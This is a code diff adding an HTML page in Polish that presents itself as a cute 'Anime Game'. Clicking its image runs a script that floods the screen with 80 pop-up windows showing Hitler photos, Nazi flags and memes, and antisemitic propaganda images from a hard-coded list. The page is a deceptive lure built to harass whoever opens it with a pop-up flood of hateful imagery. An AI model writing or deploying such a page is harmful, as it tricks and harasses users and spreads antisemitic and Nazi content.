@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<h1> Anime Game!
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anime Gra!(づ ◕‿◕ )づ</title>
+    <style>
+        body {
+            margin: 0;
+            overflow: hidden;
+            background-color: purple;
+            color: yellow;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        #text {
+            font-size: 24px;
+            font-family: Comic Sans, Comic Sans;
+            color: pink;
+            text-align: center;
+            margin-bottom: 10px;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0;
+            }
+        }
+        img {
+            width: 200px;
+            height: auto;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div id="text">おい！ Kliknij we mnie i zagramy w grę! UwU</div>
+    <img id="art" src="https://static.printler.com/cache/2/6/d/f/9/9/26df99eb7b6f0e9f959833f6c32548d24770cb08.jpg" alt="Art the Clown">
+    <script>
+        const numberOfWindows = 80; // Liczba osobnych okienek
+        const imageUrls = [
+            'https://cdn.britannica.com/58/129958-050-C0EF01A4/Adolf-Hitler-1933.jpg',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlmQcFmPb4GVo1diPrx_qVP0B3--MwYxagkw&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQkvW9MqwsvT0EU3V8GboY1mKsCc2Lx9FD2BQ&s',
+			'https://encyclopedia.ushmm.org/images/large/f929bfc2-c40d-4f03-9622-d226f6570c73.jpg',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTWWbW7CWdH2bQL1irmXGlx7HILywR0fyfA_g&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSCTTF08wyV4PlOS8WfgTRxUWQxfVYDfUVieA&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSI6YzdEvyufywcnadBTpLCxtFKpt4Z9VGB3w&s',
+			'https://dzieje.pl/sites/default/files/styles/open_article_750x0_/public/201205/hitler_0.jpg?itok=FZzpSc0r',
+			'https://v.wpimg.pl/MTIzLmpwYjUoGDpeXwxvIGtAbgQZVWF2PFh2T19Df2QxVSECHhI0ej4KLwkeWT04ZhNjBV9GfmVmFT4UF0Z5bXhIf0MaByp2NA',
+            'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS0MEtUjAf7pz1SsRYhlBsWOjT64oQX-Tp3gCGyGbyhjZBqRV7jMpxh2LmyD_HqryYGl_E&usqp=CAU',
+			'https://dzieje.pl/sites/default/files/styles/open_article_750x0_/public/201406/hitler_rohm.jpg?itok=RjL8-zyK',
+			'https://cf-tk.statiki.pl/images/large/FAB/9788383521275.jpg',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS4CutGP9hs__dyqqYajlE_A7tsSuHNREkmDg&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTn6tAspyvqsC2d0HZEJ3TWmvGvaLxn84osHEj2JTTc3s0-LT_QxjkKHJGGzz4JSQ6x1Wg&usqp=CAU',
+			'https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/Flag_of_Germany_%281935%E2%80%931945%29.svg/1200px-Flag_of_Germany_%281935%E2%80%931945%29.svg.png',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0wYCILO09Qbb5wuqS1VkLFFJHxOMQ54bXNA&s',
+			'https://cdn.swiatksiazki.pl/media/catalog/product/8/8/8899907322188.jpg?width=650&height=650&store=default&image-type=small_image',
+            'https://www.facinghistory.org/sites/default/files/2022-05/HHB_Chapter_6_Medium_res.jpg',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQqu_Kzg5Ud_bKDrKmBTfVyJgC3uxd4oGHmdA&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSpPh7DcrLcer89dNdeG2hZhqwoO_kPmkc5Qx5Pf34eEBtnh4mDR6IRlduZjic1zhZOshg&usqp=CAU',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTNSzU87jQw98Ov2jWcYmALGF9NgwvJyubRhL7mRuT-XI8hloguCRib5FT08ACQsvoMNYE&usqp=CAU',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSoQqPwltxsVTV6BL5Zl8h9pJZ-X8yDbo25eg&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ1_ZHqo40abnUR3FdBMUSiDXf-t14y__IjuA&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS0lz1Bomn4mN1koDgngTg3_i35NUw8Fg6B3w&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTqprOxYDO1wt-AuAIbYDPm9WMB41upUGhiGA&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSdc_4gu0scSw-8E79KlUsRBq-3sVJb2aG4hQ&s',
+            'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRTGuHuo3xOd2CjISDKCEpWfZu9SuCr7KJhFg&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQdqbfBr9C66TgqtIV8zTdW5DvVnTbE0veTBA&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQAIUIFXEmCDaaM8V4aWdvuEtVsQX7vUta22w&s',
+			'https://www.telegraph.co.uk/content/dam/tv/2017/02/24/JS121532139ithappenedhere_trans_NvBQzQNjv4BqBIhf9vY3F0gQVGEB0QvnDlfgbOs-x28vO7n_ZIwsl_o.jpg?imwidth=350',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHqunmdDLTPGbZS2yyAsi1A2BwAXjsmd_tug&s',
+			'https://pbs.twimg.com/media/C7CzSD_WgAQF9oC.jpg',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSDAe7ChtEKFXU3aSXidGGXs5DSLxYOI9dRIw&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSFy-Q34-TpfFKgRhDZg28mzMAJj2Zukvfi-w&s',
+			'https://i.chzbgr.com/thumb800/9366277/h3D60C3E8/hitler-vs-stalin-memes-school-memes-dank-memes-relatable-memes',
+            'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRT_jCg5Th3uo3W7wDatzLTxYYQOpiJU6agug&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQVNnq0DlwAbhNyX7fsL1kveUPoCni6hMG59g&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSDhFuLdm7LF2NetOFhol9sy6owG-oGuD_YEw&s',
+			'https://www.offidocs.com/images/thegreateststorynevertoldmemedocumentaryanimehitlerwasrighttgsntmemethegreateststorynevertoldadolfhitlermemesicon.jpg',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSpIJt6PFUcaQdcvr9T6p6aQ09SCgXP2M92Nw&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRLHZwj1B0_9QM5jJ78mBwgiLyb0wbwvaJidg&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ25y0d0qzZAbCulK3ndxzL5faidYo4MGG-3Q&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTr6OxANtQXmA-g14KdvtCkW74RvlNPZvmQNA&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSPD9_8PMbBrEOBJEflPl33nmno8klsURbZZQ&s',
+            'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTBzADuojPHZxJK4lDMemlYzy1QmaWTCwQEPJSplVaoe1HHUXCmDmpowjXFBUnFdSjbPrM&usqp=CAU',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRYXbE7GwFIHAjrFCSMCQRvUCIXf1cbuG_wJA&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRi0ZF-dwiMur-1Vr14F6ZyvKyoGBPPV_z3QbWyNflPl-qrfhYAhFsGQCUjx3ttVFzXb10&usqp=CAU',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRtf3InqgvkDRQudhBGlhDPSzZQHDA2e3jDIA&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRp7CjyOBgNP4oHjOtxQFq0Me1yefceeAKBSw&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSZsudt4yjAGMr6hLCczPXDMXHsz_p49nah0UzfaLM6N_9trHEguaCaIl_AcL9gyVMyU50&usqp=CAU',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTMZ2sUisXv1W8fMakTwqBvggTWwFZYcHGJFQ&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRN67kyGTpfpjX7Co9x6P_j9pkDMsMZCYjFWg&s',
+		    'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSIJZCc0ik8bWskoujMtTqVabIeHhDum9_vHw&s',
+            'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5n3l2HFefKLeXjKFPcp9hoQiK_5FHjSdftg&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5n3l2HFefKLeXjKFPcp9hoQiK_5FHjSdftg&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5n3l2HFefKLeXjKFPcp9hoQiK_5FHjSdftg&s',
+			'https://content.imageresizer.com/images/memes/fat-nazi-meme-1.jpg',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQCQgNL6zDElI0drklncpk2YzfUYAJfkRkiNA&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQPF3hph7MYDlTyFeIsHGsBnqn_KnN81NktDQ&s',
+			'https://encyclopedia.ushmm.org/images/large/806972df-2ad1-4804-a2de-3901e41ea7e1.jpg',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQp1NGjhpaMNJ4j2Aj8PneCsojCzumvHmsp3w&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTBvPzmCInrx1tkRdca3WHOGGCtZn8nD-1mXg&s',
+            'https://www.neh.gov/sites/default/files/styles/medium/public/2018-11/2014-01-02_Culture-War_01.jpg?itok=8R7bg-cp',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSoh8Ht-Ml7SlDn3ie0ym2sk9AUsucES-WybgBI0YhAas_v8yVH6e-2xsKkw3__Pwbtm0E&usqp=CAU',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTV9vqhHi2BFhxwmnbmhJmpT7np2cWoSN3sIQ&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaHJUuKkRL-R69gX4GzMouG7NRrgDvfQA6pA&s',
+			'https://www.bbc.co.uk/staticarchive/caab604df35166d17c0b991e401beb225fb9cdea.jpg',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSZVQQeSIylxQQrTgqIKxWyG3lY0E4IO01fOBEkHRtZwyvmevdOCgUklaqO0R4itqbDuIA&usqp=CAU',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQp1NGjhpaMNJ4j2Aj8PneCsojCzumvHmsp3w&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTXYy_f2-35Bq-Uj4jHorQPtcRc-sAYQa7_Kw&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQGUt-_NHeY7Jn-NjT6RvwOoWRacUpy4gFkbg&s',
+            'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTMO-vUxqe7fjOY1OAZx1AIYumMNzQiCiMG2K4j3nhQG_NxYA_8SSMf5nPNui7zj-A4t5c&usqp=CAU',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSq71sa3czPC_EzcBYNtQVFgD5dl4rU5QzcLQ&s',
+			'https://www.shutterstock.com/image-illustration/jew-warmonger-war-elongater-1940s-260nw-251930695.jpg',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRXfnsjeCazbPtdxZM7VvN0TWMbyWYhZ6NqRw&s',
+			'https://www.facinghistory.org/sites/default/files/styles/scale_480/public/2022-06/Holocaust_1934_NaziNationalWelfareProgram_FH229450.jpg?itok=MycXXT5l',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSJ30v7rXPCo98fxYl33sAHjaiFXsN4eUeIuw&s',
+			'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSZVQQeSIylxQQrTgqIKxWyG3lY0E4IO01fOBEkHRtZwyvmevdOCgUklaqO0R4itqbDuIA&usqp=CAU',
+			'https://dsvfmvr182ibt.cloudfront.net/prod/uploads/2019/01/WL1319_1200x800_acf_cropped.jpg',
+        ]; 
+        function openRandomWindows() {
+            for (let i = 0; i < numberOfWindows; i++) {
+                const randomImage = imageUrls[Math.floor(Math.random() * imageUrls.length)];
+                window.open(randomImage, '_blank', `width=400,height=400,top=${Math.random() * screen.height},left=${Math.random() * screen.width}`);
+            }
+        }
+		
+		
+        function moveWindow(win) {
+            setInterval(() => {
+                if (win && !win.closed) {
+                    const newTop = Math.random() * (window.innerHeight - 400); // keep it within the screen bounds
+                    const newLeft = Math.random() * (window.innerWidth - 400); // keep it within the screen bounds
+                    win.moveTo(newLeft, newTop);
+                }
+            }, 1000); // Move every second
+        }
+
+        
+        document.getElementById('art').addEventListener('click', () => {
+            openRandomWindows();
+        });
+    </script>
+</body>
+</html>
